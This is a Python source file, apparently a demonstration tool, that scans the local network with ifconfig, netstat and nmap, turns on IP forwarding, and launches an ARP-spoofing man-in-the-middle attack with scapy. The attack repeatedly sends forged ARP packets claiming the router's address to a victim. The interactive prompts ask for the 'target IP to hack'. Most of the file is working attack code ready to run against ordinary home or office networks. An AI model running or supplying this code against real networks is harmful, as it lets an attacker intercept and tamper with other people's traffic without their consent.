import numpy as np
import os 
import subprocess
import re 
import utils as util
import time
from threading import Thread
from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, conf, IP, send
from subprocess import call

###
### Python > 3.5
###

FLOODING_THREAD = None

class FloodingThread(Thread):
    def __init__(self, arp):
        Thread.__init__(self)
        self.arp = arp
        self.daemon = True
        self.running = True

    def run(self):
        while self.running:
            send(self.arp)
            time.sleep(1)

    def stop(self):
        self.running = False

def launch_scanning_network(MAC_OS=True):
    LINUX = False
    MAC_OS = True
    result = []

    if MAC_OS:
        #Recover network informations needed to execute the MiTM demonstration

        util.modify_ip_forwarding(activate=True)

        print('----- '+str('Network Info')+' -----')
        ifconfig_process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
        grep_process = subprocess.run(['grep', 'inet 192.168.'], stdin=ifconfig_process.stdout, stdout=subprocess.PIPE)
        our_ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(grep_process.stdout))[0]
        result.append('Your local ip address : '+str(our_ip))
        print('Your local ip address : '+str(our_ip))

        netmask = re.findall(r'([0-9a-fA-Fx]{10})', str(grep_process.stdout))
        netmask = ''.join(netmask)
        netmask = netmask[2:]
        binary_mask = util.hex2bin(netmask)
        print('Subnetwork mask : '+str(binary_mask))
        
        mask_length = str(binary_mask).count('1')
        print('Subnetwork mask binary length: '+str(mask_length))

        netstat_process = subprocess.Popen(['netstat -nr'], shell=True, stdout=subprocess.PIPE)
        grep_process = subprocess.run(['grep', 'default'], stdin=netstat_process.stdout, stdout=subprocess.PIPE)
        route_ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(grep_process.stdout))[0]
        result.append('Router IP : '+str(route_ip))
        print('Router IP : '+str(route_ip))

        print('----- '+str('Scanning Network')+' -----')
        route_ip_ends_0 = ''.join([route_ip[:-2], '.'])
        route_ip_ends_0 = route_ip_ends_0 + str(0) + str('/') + str(mask_length)
        res = os.popen('sudo nmap -sP '+str(route_ip_ends_0)).read()
        result.append('\n')
        result.append(res)
        print('---------------------')
        #nmap scan report ; Host is up ; MAC adress
        #ip.src == 192.168.0.16 and (udp.port == 53 || tcp.port == 53)

    elif LINUX:
        #TODO
        os.system("sudo echo 1 > '/proc/sys/net/ipv4/ip_forward'")
        print('IP forwarding update to 1')

    else:
        raise ValueError('WINDOWS OS not supported.')

    return result


def arp_mitm_attack(victim_ip, victim_mac, router_ip):
    global FLOODING_THREAD
    op=1 # Op code 1 for ARP requests
    arp=ARP(op=op, psrc=router_ip, pdst=victim_ip, hwdst=victim_mac)
         
    FLOODING_THREAD = FloodingThread(arp)
    FLOODING_THREAD.start()

def arp_mitm_attack_without_input():
    global FLOODING_THREAD
    op=1 # Op code 1 for ARP requests

    victim_ip=input('Enter the target IP to hack: ') #person IP to attack
    victim_ip=victim_ip.replace(" ","")

    victim_mac=input('Enter the target MAC to hack: ') #mac of the victim
    victim_mac=victim_mac.replace("-",":")
    victim_mac=victim_mac.replace(" ","")

    router_ip=input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') #routers IP.. Should be the same one.
    router_ip=router_ip.replace(" ","")

    arp=ARP(op=op, psrc=router_ip, pdst=victim_ip, hwdst=victim_mac)

    FLOODING_THREAD = FloodingThread(arp)
    FLOODING_THREAD.start()  

def stop_attack():
    global FLOODING_THREAD
    
    FLOODING_THREAD.stop() #stop arp flooding
    util.modify_ip_forwarding(activate=False)